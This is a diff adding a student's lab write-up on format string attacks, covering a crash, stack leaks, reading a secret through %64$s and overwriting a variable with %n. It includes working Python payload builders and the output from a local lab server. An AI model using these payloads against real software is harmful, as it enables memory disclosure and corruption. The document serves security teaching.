@@ -70,3 +70,128 @@ Flag:
 ```
 flag{91b434959469afb533a5516651d74c98}
 ```
+
+---
+
+## Format String Attack Lab
+
+### Task 1
+
+Creating a `badfile` with `content = ("%s"*750).encode('latin-1')` and sending it as input of the program, it will crash, as it will try to read 750 strings from the stack.
+
+### Task 2
+
+#### 2.A
+
+To get the stack data the following script was executed to build the `badfile`:
+
+```py
+#!/usr/bin/python3
+import sys
+
+content = ("AAAA" + " %x"*64).encode('latin-1')
+
+with open('badfile', 'wb') as f:
+  f.write(content)
+```
+
+With 64 `%x` we are able to get the `41414141` corresponding to the `AAAA` string.
+
+#### 2.B
+
+To get the secret message, the following script was used to build the `badfile`:
+
+```py
+#!/usr/bin/python3
+import sys
+
+address = 0x080b4008
+content = (address).to_bytes(4,byteorder='little')
+
+s = ("%64$s").encode('latin-1')
+content += s
+
+# Write the content to badfile
+with open('badfile', 'wb') as f:
+  f.write(content)
+```
+
+We start of by writting to the stack the address that we want to read. From the server output, we know that the address is `0x080b4008`. If we send `%s`, printf will try to read a string from an address. To specify which address we should use, we can add `<offset>$` between `%` and `s`. The offset is, as we have seen before, the number of `%x` that we need to print to get the beggining of the stack. As the number was 64, if we use the format specifier `%64$s` after the address, the program will try to read a string from the address written in the 64th position in the stack, which will be the address that we have just put there (the secret message's address). Sending this input to the server, we get the secret message, which is:
+
+```
+A secret message
+```
+
+### Task 3
+
+#### 3.A
+
+To change the `target` variable value, the following script was used to build the `badfile`:
+
+```py
+#!/usr/bin/python3
+import sys
+
+address = 0x080e5068
+content = (address).to_bytes(4,byteorder='little')
+s = ("%64$n").encode('latin-1')
+content += s
+
+# Write the content to badfile
+with open('badfile', 'wb') as f:
+  f.write(content)
+```
+
+The script builds the string the same way as the previous task, putting the address of the variable up front and then a format specifier, but this specifier this time is a `%n`. In printf(), `%n` is a special format specifier which instead of printing, causes printf() to load the variable pointed by the corresponding argument with a value equal to the number of characters that have been printed by printf() before the occurrence of `%n`. We could use this feature to store the number of bytes written so far (4 because of the address) in the `target` variable. 
+
+With this input, the server output is the following, which means that we have successfully changed the value of the `target` variable:
+
+```
+server-10.9.0.5 | Got a connection from 10.9.0.1
+server-10.9.0.5 | Starting format
+server-10.9.0.5 | The input buffer's address:    0xffffd450
+server-10.9.0.5 | The secret message's address:  0x080b4008
+server-10.9.0.5 | The target variable's address: 0x080e5068
+server-10.9.0.5 | Waiting for user input ......
+server-10.9.0.5 | Received 9 bytes.
+server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd378
+server-10.9.0.5 | The target variable's value (before): 0x11223344
+server-10.9.0.5 | hThe target variable's value (after):  0x00000004
+server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
+```
+
+#### 3.B
+
+For this task, we need to build the script the same way as the previous one, but with some changes. The following script was the result:
+
+```py
+#!/usr/bin/python3
+import sys
+
+address = 0x080e5068
+content = (address).to_bytes(4,byteorder='little')
+s = ("%20476x%64$n").encode('latin-1')
+content += s
+
+# Write the content to badfile
+with open('badfile', 'wb') as f:
+  f.write(content)
+```
+
+In order to change the value to `0x5000`, we can't just simply write 20480 (`0x5000` in decimal) bytes to the file, as the program will only read at most 1500. First of all, we write the 4 bytes for the address. After that, the remaining 20476 bytes can be filled using the `%x` format specifier with a fixed width. With `%[width]x`, the program will read `width` bytes and try to print them. Then, the specifier `%n` will stop it from printing those bytes, but will still count them, so the value stored in the address will be the value that we want. After sending this input, the server output is the following:
+
+```
+server-10.9.0.5 | Got a connection from 10.9.0.1
+server-10.9.0.5 | Starting format
+server-10.9.0.5 | The input buffer's address:    0xffffd450
+server-10.9.0.5 | The secret message's address:  0x080b4008
+server-10.9.0.5 | The target variable's address: 0x080e5068
+server-10.9.0.5 | Waiting for user input ......
+server-10.9.0.5 | Received 16 bytes.
+server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd378
+server-10.9.0.5 | The target variable's value (before): 0x11223344
+server-10.9.0.5 | [output here]The target variable's value (after):  0x00005000
+server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
+```
+
+**Note:** The `[output here]` in the server was replaced in orther to keep it clean. In the original server, as `%n` prints empty spaces, the ouput ocupied a very large amount of empty space in the console.
